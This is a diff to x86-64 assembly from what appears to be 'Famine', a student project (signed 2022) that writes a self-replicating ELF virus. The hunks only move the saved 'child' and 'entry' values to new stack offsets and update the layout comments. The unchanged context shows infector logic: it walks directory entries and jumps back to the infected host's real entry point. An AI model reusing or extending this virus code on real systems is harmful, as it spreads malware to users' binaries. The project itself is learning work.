@@ -58,9 +58,9 @@ sc:
 				mov				rax,					qword[rel sc_real_entry]
 				mov				qword[rsp+0xc70],		rax
 				mov				rax,					qword[rel sc_child]
-				mov				qword[rsp+0xc78],		rax
+				mov				qword[rsp+0x20],		rax
 				mov				rax,					qword[rel sc_entry]
-				mov				qword[rsp+0xc80],		rax
+				mov				qword[rsp+0x28],		rax
 
 				lea				rdi,					[rel sc_dir_1]
 				lea				rsi,					[rel sc_proc_entries]
@@ -72,11 +72,11 @@ sc:
 
 				mov				rax,					qword[rsp+0xc70]
 
-				cmp				qword[rsp+0xc78],		0
+				cmp				qword[rsp+0x20],		0
 				je				.jump
 
 				lea				r8,						[rel sc]
-				sub				r8,						qword[rsp+0xc80]
+				sub				r8,						qword[rsp+0x28]
 				add				rax,					r8
 .jump:
 				pop				rdx
@@ -831,8 +831,10 @@ sc_get_full_path:
 				ret
 sc_glob:
 				dq				0	; +0x18		->	sz.mem
-									; +0x20		->	sz.code			; unused
-									; +0x28		->	sz.data			; unused
+
+									; +0x20		->	child
+									; +0x28		-> 	entry
+
 									; +0x30		->	sz.load
 									; +0x38		->	sz.f_pad
 									; +0x40		->	sz.m_pad
@@ -848,8 +850,6 @@ sc_glob:
 									; +0xc60	->	*mem
 									; +0xc68	->	x_pad
 									; +0xc70 	->	real_entry
-									; +0xc78	->	child
-									; +0xc80	-> 	entry
 sc_sign:
 				db				"Famine (42 project) - 2022 - by apitoise & fcadet", 0
 sc_end:
